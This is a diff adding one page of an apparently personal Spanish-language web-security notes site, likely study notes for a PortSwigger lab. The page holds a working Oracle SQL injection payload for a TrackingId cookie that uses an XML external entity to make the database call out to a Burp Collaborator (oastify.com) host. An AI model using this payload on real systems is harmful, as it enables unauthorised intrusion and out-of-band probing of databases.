@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>M0B notes</title>
+  <meta name="description" content="&lt;p&gt;Oracle&lt;/p&gt;">
+  <link rel="stylesheet" href="/assets/css/style.css">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link rel="icon" href="/M0B.png" type="image/png">
+  <style>
+    /* fallback si la hoja no carga */
+    body{background:#000;color:#e6e6e6;font:16px/1.7 ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace}
+  </style>
+  
+  <script defer src="/assets/js/copy-code.js"></script>
+</head>
+<body>
+  <header class="site-header">
+    <div class="site-brand">
+      <img class="brand-logo" src="/M0B.png" alt="logo" />
+      <div class="brand-title">M0B notes</div>
+    </div>
+    <nav class="site-nav">
+      <a href="/">Inicio</a>
+      <a href="/puertos/">Puertos</a>
+      <a href="/escalada/">Escalada</a>
+      <a href="/portswigger/">Portswigger</a>
+      <a href="/hackthebox/">HackTheBox</a>
+      <a href="/real_life/">Real Life</a>
+      <a href="/extras/">Extras</a>
+    </nav>
+  </header>
+
+  <main>
+    <div class="container">
+      <p>Oracle</p>
+
+<p>https://portswigger.net/web-security/sql-injection/cheat-sheet</p>
+
+<div class="language-R highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">TrackingId</span><span class="o">=</span><span class="n">x</span><span class="s1">'+UNION+SELECT+EXTRACTVALUE(xmltype('</span><span class="o">&lt;%3fxml+version%</span><span class="m">3</span><span class="n">d</span><span class="s2">"1.0"</span><span class="o">+</span><span class="n">encoding</span><span class="o">%3d"UTF-8"%</span><span class="m">3</span><span class="n">f</span><span class="o">&gt;&lt;!</span><span class="n">DOCTYPE</span><span class="o">+</span><span class="n">root</span><span class="o">+</span><span class="p">[</span><span class="o">+&lt;!</span><span class="n">ENTITY</span><span class="o">+%25+remote+SYSTEM+"http%</span><span class="m">3</span><span class="n">a</span><span class="o">//</span><span class="n">bixkdbjkewy7v26t6d9ep4em9df73zunj.oastify.com</span><span class="o">/</span><span class="err">"</span><span class="o">&gt;+%25remote%</span><span class="m">3</span><span class="n">b</span><span class="p">]</span><span class="o">&gt;</span><span class="s1">'),'</span><span class="o">/</span><span class="n">l</span><span class="err">'</span><span class="p">)</span><span class="o">+</span><span class="n">FROM</span><span class="o">+</span><span class="n">dual</span><span class="o">--</span><span class="w">
+</span></code></pre></div></div>
+
+      <div class="footer">
+        <span class="muted">© 2025 · Generado con Jekyll</span>
+      </div>
+    </div>
+  </main>
+</body>
+</html>
+
